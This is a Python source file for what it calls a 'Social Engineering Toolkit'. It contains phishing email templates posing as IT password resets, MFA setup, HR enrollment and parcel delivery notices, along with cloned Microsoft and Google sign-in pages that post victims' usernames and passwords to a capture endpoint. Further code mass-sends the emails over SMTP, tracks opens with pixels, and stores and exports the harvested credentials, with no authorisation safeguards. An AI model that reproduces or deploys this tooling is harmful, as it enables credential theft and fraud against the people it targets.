"""
Social Engineering Toolkit
Phishing, credential harvesting, and social engineering attacks
"""

import asyncio
import os
import json
import hashlib
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
from datetime import datetime
import logging
import aiohttp
from urllib.parse import urlparse, urljoin
import re

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Social engineering attack types"""
    PHISHING = "phishing"
    SPEAR_PHISHING = "spear_phishing"
    CREDENTIAL_HARVESTER = "credential_harvester"
    WATERING_HOLE = "watering_hole"
    PRETEXTING = "pretexting"
    VISHING = "vishing"
    SMISHING = "smishing"
    BAITING = "baiting"


class TemplateType(Enum):
    """Email/page template types"""
    CORPORATE = "corporate"
    BANKING = "banking"
    SOCIAL_MEDIA = "social_media"
    TECH_SUPPORT = "tech_support"
    HR_DEPARTMENT = "hr_department"
    IT_SECURITY = "it_security"
    SHIPPING = "shipping"
    CUSTOM = "custom"


@dataclass
class PhishingCampaign:
    """Phishing campaign configuration"""
    campaign_id: str
    name: str
    attack_type: AttackType
    template_type: TemplateType
    targets: List[str] = field(default_factory=list)
    from_address: str = ""
    from_name: str = ""
    subject: str = ""
    email_body: str = ""
    landing_page: str = ""
    tracking_enabled: bool = True
    created_at: datetime = field(default_factory=datetime.now)
    status: str = "draft"
    
    # Stats
    emails_sent: int = 0
    emails_opened: int = 0
    links_clicked: int = 0
    credentials_captured: int = 0


@dataclass
class CapturedCredential:
    """Captured credential from phishing"""
    campaign_id: str
    target_email: str
    username: str
    password: str
    ip_address: str
    user_agent: str
    captured_at: datetime = field(default_factory=datetime.now)
    additional_data: Dict[str, str] = field(default_factory=dict)


@dataclass
class EmailTemplate:
    """Email template"""
    template_id: str
    name: str
    template_type: TemplateType
    subject: str
    body_html: str
    body_text: str = ""
    variables: List[str] = field(default_factory=list)


class SocialEngineeringToolkit:
    """
    Social Engineering Toolkit
    Comprehensive phishing and social engineering capabilities
    """
    
    # Email Templates
    TEMPLATES = {
        TemplateType.CORPORATE: {
            "password_reset": EmailTemplate(
                template_id="corp_password_reset",
                name="Corporate Password Reset",
                template_type=TemplateType.CORPORATE,
                subject="Action Required: Password Reset Notification",
                body_html="""
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; }
        .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
        .content { padding: 20px; background: #f5f5f5; }
        .button { background: #0066cc; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; display: inline-block; }
        .footer { padding: 20px; font-size: 12px; color: #666; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{{company_name}}</h1>
        </div>
        <div class="content">
            <h2>Password Reset Required</h2>
            <p>Dear {{target_name}},</p>
            <p>Our security team has detected unusual activity on your account. As a precautionary measure, we require you to reset your password immediately.</p>
            <p>Please click the button below to reset your password within the next 24 hours:</p>
            <p style="text-align: center;">
                <a href="{{phishing_link}}" class="button">Reset Password Now</a>
            </p>
            <p>If you did not request this password reset, please contact IT support immediately.</p>
            <p>Best regards,<br>IT Security Team</p>
        </div>
        <div class="footer">
            <p>This is an automated message from {{company_name}} IT Department</p>
            <p>{{tracking_pixel}}</p>
        </div>
    </div>
</body>
</html>
""",
                variables=["company_name", "target_name", "phishing_link", "tracking_pixel"]
            ),
            "document_share": EmailTemplate(
                template_id="corp_doc_share",
                name="Shared Document Notification",
                template_type=TemplateType.CORPORATE,
                subject="{{sender_name}} shared a document with you",
                body_html="""
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .container { max-width: 600px; margin: 0 auto; }
        .card { border: 1px solid #ddd; border-radius: 8px; padding: 20px; margin: 20px 0; }
        .button { background: #1a73e8; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>📄 Document Shared</h2>
            <p><strong>{{sender_name}}</strong> has shared a document with you:</p>
            <p style="font-size: 18px; color: #1a73e8;">{{document_name}}</p>
            <p><a href="{{phishing_link}}" class="button">Open Document</a></p>
        </div>
        <p style="color: #666; font-size: 12px;">
            You received this email because {{sender_name}} shared a file with {{target_email}}
        </p>
    </div>
</body>
</html>
""",
                variables=["sender_name", "document_name", "phishing_link", "target_email"]
            ),
        },
        TemplateType.IT_SECURITY: {
            "mfa_setup": EmailTemplate(
                template_id="it_mfa_setup",
                name="MFA Setup Required",
                template_type=TemplateType.IT_SECURITY,
                subject="[URGENT] Multi-Factor Authentication Setup Required",
                body_html="""
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .alert { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; }
        .button { background: #28a745; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
        <img src="{{company_logo}}" alt="{{company_name}}" style="max-width: 150px;">
        
        <div class="alert">
            <strong>⚠️ Security Notice</strong><br>
            Your account requires Multi-Factor Authentication setup by {{deadline}}.
        </div>
        
        <h2>Set Up Your MFA</h2>
        <p>Dear {{target_name}},</p>
        <p>As part of our enhanced security measures, all employees must enable Multi-Factor Authentication (MFA) on their accounts.</p>
        
        <p>Please complete your MFA setup before <strong>{{deadline}}</strong> to maintain access to company resources.</p>
        
        <p style="text-align: center;">
            <a href="{{phishing_link}}" class="button">Set Up MFA Now</a>
        </p>
        
        <p>Best regards,<br>Information Security Team</p>
    </div>
</body>
</html>
""",
                variables=["company_name", "company_logo", "target_name", "deadline", "phishing_link"]
            ),
        },
        TemplateType.HR_DEPARTMENT: {
            "benefits_update": EmailTemplate(
                template_id="hr_benefits",
                name="Benefits Enrollment",
                template_type=TemplateType.HR_DEPARTMENT,
                subject="Open Enrollment: Update Your Benefits Selection",
                body_html="""
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; color: #333; }
        .header { background: #2c3e50; color: white; padding: 20px; }
        .content { padding: 20px; }
        .highlight { background: #e8f4f8; padding: 15px; border-left: 4px solid #3498db; }
        .button { background: #3498db; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div style="max-width: 600px; margin: 0 auto;">
        <div class="header">
            <h1>Human Resources</h1>
        </div>
        <div class="content">
            <h2>Open Enrollment Period</h2>
            <p>Dear {{target_name}},</p>
            
            <div class="highlight">
                <strong>Important:</strong> Open enrollment ends on {{deadline}}. Please review and update your benefits selections.
            </div>
            
            <p>During this period, you can:</p>
            <ul>
                <li>Update your health insurance plan</li>
                <li>Modify your 401(k) contributions</li>
                <li>Add or remove dependents</li>
                <li>Enroll in additional benefits</li>
            </ul>
            
            <p style="text-align: center;">
                <a href="{{phishing_link}}" class="button">Access Benefits Portal</a>
            </p>
            
            <p>Questions? Contact HR at hr@{{company_domain}}</p>
        </div>
    </div>
</body>
</html>
""",
                variables=["target_name", "deadline", "phishing_link", "company_domain"]
            ),
        },
        TemplateType.SHIPPING: {
            "delivery_notification": EmailTemplate(
                template_id="shipping_delivery",
                name="Package Delivery Notification",
                template_type=TemplateType.SHIPPING,
                subject="Your package is on its way! Track your delivery",
                body_html="""
<!DOCTYPE html>
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .tracking { background: #f0f0f0; padding: 20px; text-align: center; border-radius: 8px; }
        .tracking-number { font-size: 24px; font-weight: bold; color: #0066cc; }
        .button { background: #ff9900; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>
    <div style="max-width: 600px; margin: 0 auto; padding: 20px;">
        <h1 style="color: #232f3e;">📦 Shipment Update</h1>
        
        <div class="tracking">
            <p>Your tracking number:</p>
            <p class="tracking-number">{{tracking_number}}</p>
        </div>
        
        <p>Hello {{target_name}},</p>
        <p>Great news! Your package is out for delivery and should arrive today.</p>
        
        <p><strong>Estimated delivery:</strong> {{delivery_date}}</p>
        
        <p style="text-align: center;">
            <a href="{{phishing_link}}" class="button">Track Your Package</a>
        </p>
        
        <p style="color: #666; font-size: 12px;">
            If you're not expecting a package, please click the tracking link to report this delivery.
        </p>
    </div>
</body>
</html>
""",
                variables=["tracking_number", "target_name", "delivery_date", "phishing_link"]
            ),
        },
    }
    
    # Landing Page Templates
    LANDING_PAGES = {
        "microsoft_login": """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in to your account</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f2f2f2; margin: 0; padding: 0; }
        .container { max-width: 440px; margin: 100px auto; background: white; padding: 44px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 108px; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 12px; border: 1px solid #666; font-size: 15px; box-sizing: border-box;
        }
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #0067b8; outline: none;
        }
        .btn-primary {
            width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer;
        }
        .btn-primary:hover { background: #005a9e; }
        .links { margin-top: 16px; }
        .links a { color: #0067b8; text-decoration: none; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 108 24" width="108" height="24">
                <path fill="#737373" d="M44.836 4.6v14.8h-2.36V7.6l-4.56 8.36h-1.2l-4.6-8.32v11.76h-2.24V4.6h2.56l4.84 9.04 4.88-9.04h2.68zm3.56 2.2a1.32 1.32 0 01-.96-.4 1.28 1.28 0 01-.4-.96c0-.4.12-.72.4-.96s.6-.4.96-.4c.4 0 .72.12.96.4s.4.56.4.96-.12.72-.4.96-.56.4-.96.4zm1.12 12.6h-2.24V9h2.24v10.4zm7.2.2c-1.32 0-2.4-.4-3.24-1.24-.84-.84-1.24-1.96-1.24-3.36s.4-2.56 1.16-3.4c.8-.88 1.8-1.32 3.04-1.32 1.2 0 2.12.4 2.84 1.16.72.76 1.08 1.8 1.08 3.08v.88h-5.84c.04.76.28 1.36.72 1.8.44.44 1.04.68 1.76.68.96 0 1.8-.36 2.52-1.12l1.16 1.32c-.92 1.04-2.16 1.52-3.96 1.52zm-.28-7.56c-.56 0-1 .2-1.36.56-.36.36-.56.88-.64 1.52h3.84c-.04-.64-.24-1.16-.56-1.52-.36-.36-.8-.56-1.28-.56zm8.88-.84c.4-.68.88-1.2 1.44-1.52.56-.36 1.2-.52 1.88-.52v2.28h-.6c-.76 0-1.36.2-1.76.6-.4.4-.6 1.08-.6 2.04v6h-2.24V9h2.16l-.28 2.2zm10.76-2.4c1.24 0 2.24.4 3 1.24.76.84 1.12 1.96 1.12 3.36s-.4 2.52-1.12 3.36c-.76.84-1.76 1.24-3 1.24-1.28 0-2.28-.44-3-1.32v1.12h-2.16V4.2h2.24v5.92c.72-.84 1.68-1.32 2.92-1.32zm-.48 7.4c.72 0 1.28-.24 1.72-.76.44-.52.64-1.24.64-2.12 0-.92-.2-1.6-.64-2.12-.44-.52-1-.76-1.72-.76-.72 0-1.28.24-1.72.76-.44.52-.68 1.2-.68 2.12s.24 1.6.68 2.12c.44.52 1 .76 1.72.76zm12.16 3.4c-1.28 0-2.32-.4-3.12-1.24-.8-.84-1.2-1.96-1.2-3.36 0-1.44.4-2.56 1.2-3.4.8-.84 1.84-1.24 3.12-1.24s2.32.4 3.12 1.24c.8.84 1.2 1.96 1.2 3.4 0 1.4-.4 2.52-1.2 3.36-.8.84-1.84 1.24-3.12 1.24zm0-1.8c.72 0 1.28-.24 1.72-.76.44-.52.64-1.2.64-2.08 0-.88-.2-1.56-.64-2.08-.44-.52-1-.76-1.72-.76-.72 0-1.28.24-1.72.76-.44.52-.64 1.2-.64 2.08 0 .88.2 1.56.64 2.08.44.52 1 .76 1.72.76zm12.2 1.8c-1.28 0-2.32-.4-3.12-1.24-.8-.84-1.2-1.96-1.2-3.36 0-1.44.4-2.56 1.2-3.4.8-.84 1.84-1.24 3.12-1.24s2.32.4 3.12 1.24c.8.84 1.2 1.96 1.2 3.4 0 1.4-.4 2.52-1.2 3.36-.8.84-1.84 1.24-3.12 1.24zm0-1.8c.72 0 1.28-.24 1.72-.76.44-.52.64-1.2.64-2.08 0-.88-.2-1.56-.64-2.08-.44-.52-1-.76-1.72-.76-.72 0-1.28.24-1.72.76-.44.52-.64 1.2-.64 2.08 0 .88.2 1.56.64 2.08.44.52 1 .76 1.72.76z"/>
                <path fill="#f25022" d="M0 0h11.377v11.377H0z"/>
                <path fill="#00a4ef" d="M0 12.623h11.377V24H0z"/>
                <path fill="#7fba00" d="M12.623 0H24v11.377H12.623z"/>
                <path fill="#ffb900" d="M12.623 12.623H24V24H12.623z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <form id="loginForm" action="{{capture_endpoint}}" method="POST">
            <input type="hidden" name="campaign_id" value="{{campaign_id}}">
            <div class="form-group">
                <input type="text" name="username" placeholder="Email, phone, or Skype" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="btn-primary">Sign in</button>
            <div class="links">
                <a href="#">Can't access your account?</a>
            </div>
        </form>
    </div>
</body>
</html>
""",
        "google_login": """
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; margin: 0; }
        .container { max-width: 450px; margin: 50px auto; padding: 48px 40px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #202124; margin-bottom: 32px; }
        .form-group { margin-bottom: 24px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;
        }
        input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
        .btn-next {
            background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right;
        }
        .btn-next:hover { background: #1557b0; }
        .links { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <path fill="#4285F4" d="M7.5 12c0-1.03.17-2.02.47-2.94L2.17 4.84C.77 7.03 0 9.42 0 12s.77 4.97 2.17 7.16l5.8-4.22A7.35 7.35 0 017.5 12z"/>
                <path fill="#34A853" d="M12 19.5c2.15 0 4.1-.72 5.63-1.94l-5.8-4.22c-.84.57-1.88.91-3.05.91-2.36 0-4.36-1.56-5.08-3.69l-5.8 4.22C1.93 18.9 6.49 22 12 22c2.93 0 5.59-1.06 7.68-2.83l-5.15-3.99c-1.1.72-2.45 1.14-3.9 1.14-2.97 0-5.5-2.01-6.4-4.72l-5.8 4.22c1.63 3.23 5.01 5.68 9.07 5.68z"/>
                <path fill="#FBBC05" d="M12 4.5c1.68 0 3.19.58 4.38 1.71l3.28-3.28C17.59 1.06 14.93 0 12 0 7.31 0 3.18 2.78 1.25 6.78l5.8 4.22c.9-2.71 3.43-4.72 6.4-4.72z"/>
                <path fill="#EA4335" d="M23.5 12c0-.78-.07-1.53-.18-2.25H12v4.26h6.46c-.28 1.5-1.13 2.77-2.41 3.62l3.7 2.87c2.15-1.98 3.4-4.9 3.4-8.25z"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form action="{{capture_endpoint}}" method="POST">
            <input type="hidden" name="campaign_id" value="{{campaign_id}}">
            <div class="form-group">
                <input type="text" name="username" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            <a href="#" class="links">Forgot email?</a>
            <button type="submit" class="btn-next">Next</button>
        </form>
    </div>
</body>
</html>
""",
        "generic_login": """
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 100%; max-width: 400px; }
        h1 { text-align: center; margin-bottom: 30px; color: #333; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border-color: #667eea; outline: none; }
        button { width: 100%; padding: 12px; background: #667eea; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #5a67d8; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>{{company_name}}</h1>
        <form action="{{capture_endpoint}}" method="POST">
            <input type="hidden" name="campaign_id" value="{{campaign_id}}">
            <div class="form-group">
                <label>Email Address</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
""",
    }
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.campaigns: Dict[str, PhishingCampaign] = {}
        self.captured_credentials: List[CapturedCredential] = []
        self.smtp_config: Dict[str, Any] = {}
    
    def configure_smtp(self, host: str, port: int, username: str, 
                       password: str, use_tls: bool = True):
        """Configure SMTP settings"""
        self.smtp_config = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'use_tls': use_tls
        }
    
    def create_campaign(self, name: str, attack_type: AttackType,
                        template_type: TemplateType) -> PhishingCampaign:
        """Create a new phishing campaign"""
        campaign_id = hashlib.md5(f"{name}{datetime.now()}".encode()).hexdigest()[:12]
        
        campaign = PhishingCampaign(
            campaign_id=campaign_id,
            name=name,
            attack_type=attack_type,
            template_type=template_type
        )
        
        self.campaigns[campaign_id] = campaign
        return campaign
    
    def add_targets(self, campaign_id: str, targets: List[str]):
        """Add targets to campaign"""
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].targets.extend(targets)
    
    def get_template(self, template_type: TemplateType, template_name: str) -> Optional[EmailTemplate]:
        """Get email template"""
        if template_type in self.TEMPLATES:
            return self.TEMPLATES[template_type].get(template_name)
        return None
    
    def render_template(self, template: EmailTemplate, variables: Dict[str, str]) -> str:
        """Render template with variables"""
        html = template.body_html
        for var_name, var_value in variables.items():
            html = html.replace(f"{{{{{var_name}}}}}", var_value)
        return html
    
    def render_landing_page(self, page_name: str, variables: Dict[str, str]) -> str:
        """Render landing page template"""
        if page_name in self.LANDING_PAGES:
            html = self.LANDING_PAGES[page_name]
            for var_name, var_value in variables.items():
                html = html.replace(f"{{{{{var_name}}}}}", var_value)
            return html
        return ""
    
    def generate_tracking_pixel(self, campaign_id: str, target_email: str) -> str:
        """Generate tracking pixel HTML"""
        # In production, this would point to your tracking server
        tracking_id = hashlib.md5(f"{campaign_id}{target_email}".encode()).hexdigest()
        return f'<img src="{{{{tracking_server}}}}/track/{tracking_id}" width="1" height="1" />'
    
    def generate_phishing_link(self, campaign_id: str, target_email: str,
                               base_url: str) -> str:
        """Generate unique phishing link for target"""
        token = hashlib.md5(f"{campaign_id}{target_email}".encode()).hexdigest()
        return f"{base_url}?t={token}"
    
    async def send_email(self, to_address: str, subject: str, 
                         body_html: str, from_address: str,
                         from_name: str = "") -> bool:
        """Send phishing email"""
        if not self.smtp_config:
            logger.error("SMTP not configured")
            return False
        
        try:
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = f"{from_name} <{from_address}>" if from_name else from_address
            msg['To'] = to_address
            
            # Add HTML body
            html_part = MIMEText(body_html, 'html')
            msg.attach(html_part)
            
            # Connect and send
            if self.smtp_config['use_tls']:
                context = ssl.create_default_context()
                with smtplib.SMTP(self.smtp_config['host'], self.smtp_config['port']) as server:
                    server.starttls(context=context)
                    server.login(self.smtp_config['username'], self.smtp_config['password'])
                    server.send_message(msg)
            else:
                with smtplib.SMTP_SSL(self.smtp_config['host'], self.smtp_config['port']) as server:
                    server.login(self.smtp_config['username'], self.smtp_config['password'])
                    server.send_message(msg)
            
            return True
            
        except Exception as e:
            logger.error(f"Email send error: {e}")
            return False
    
    async def launch_campaign(self, campaign_id: str) -> Dict[str, Any]:
        """Launch phishing campaign"""
        if campaign_id not in self.campaigns:
            return {'success': False, 'error': 'Campaign not found'}
        
        campaign = self.campaigns[campaign_id]
        results = {
            'success': True,
            'campaign_id': campaign_id,
            'emails_sent': 0,
            'errors': []
        }
        
        for target in campaign.targets:
            try:
                # Generate personalized content
                variables = {
                    'target_email': target,
                    'target_name': target.split('@')[0],
                    'phishing_link': self.generate_phishing_link(
                        campaign_id, target, campaign.landing_page
                    ),
                    'tracking_pixel': self.generate_tracking_pixel(campaign_id, target)
                }
                
                body = campaign.email_body
                for var, value in variables.items():
                    body = body.replace(f"{{{{{var}}}}}", value)
                
                # Send email
                success = await self.send_email(
                    to_address=target,
                    subject=campaign.subject,
                    body_html=body,
                    from_address=campaign.from_address,
                    from_name=campaign.from_name
                )
                
                if success:
                    results['emails_sent'] += 1
                    campaign.emails_sent += 1
                else:
                    results['errors'].append(f"Failed to send to {target}")
                
            except Exception as e:
                results['errors'].append(f"Error for {target}: {str(e)}")
        
        campaign.status = "launched"
        return results
    
    def capture_credentials(self, campaign_id: str, username: str, 
                           password: str, ip_address: str, 
                           user_agent: str) -> CapturedCredential:
        """Capture credentials from phishing form"""
        cred = CapturedCredential(
            campaign_id=campaign_id,
            target_email="",  # Would be determined from tracking token
            username=username,
            password=password,
            ip_address=ip_address,
            user_agent=user_agent
        )
        
        self.captured_credentials.append(cred)
        
        # Update campaign stats
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].credentials_captured += 1
        
        return cred
    
    def track_email_open(self, campaign_id: str, tracking_id: str):
        """Track email open via pixel"""
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].emails_opened += 1
    
    def track_link_click(self, campaign_id: str, token: str):
        """Track link click"""
        if campaign_id in self.campaigns:
            self.campaigns[campaign_id].links_clicked += 1
    
    def get_campaign_stats(self, campaign_id: str) -> Dict[str, Any]:
        """Get campaign statistics"""
        if campaign_id not in self.campaigns:
            return {}
        
        campaign = self.campaigns[campaign_id]
        
        open_rate = (campaign.emails_opened / campaign.emails_sent * 100) if campaign.emails_sent > 0 else 0
        click_rate = (campaign.links_clicked / campaign.emails_sent * 100) if campaign.emails_sent > 0 else 0
        capture_rate = (campaign.credentials_captured / campaign.links_clicked * 100) if campaign.links_clicked > 0 else 0
        
        return {
            'campaign_id': campaign_id,
            'name': campaign.name,
            'status': campaign.status,
            'total_targets': len(campaign.targets),
            'emails_sent': campaign.emails_sent,
            'emails_opened': campaign.emails_opened,
            'links_clicked': campaign.links_clicked,
            'credentials_captured': campaign.credentials_captured,
            'open_rate': f"{open_rate:.1f}%",
            'click_rate': f"{click_rate:.1f}%",
            'capture_rate': f"{capture_rate:.1f}%"
        }
    
    def export_credentials(self, campaign_id: str = None) -> List[Dict]:
        """Export captured credentials"""
        creds = self.captured_credentials
        
        if campaign_id:
            creds = [c for c in creds if c.campaign_id == campaign_id]
        
        return [
            {
                'campaign_id': c.campaign_id,
                'username': c.username,
                'password': c.password,
                'ip_address': c.ip_address,
                'user_agent': c.user_agent,
                'captured_at': c.captured_at.isoformat()
            }
            for c in creds
        ]
    
    def list_templates(self) -> Dict[str, List[str]]:
        """List available templates"""
        return {
            template_type.value: list(templates.keys())
            for template_type, templates in self.TEMPLATES.items()
        }
    
    def list_landing_pages(self) -> List[str]:
        """List available landing pages"""
        return list(self.LANDING_PAGES.keys())
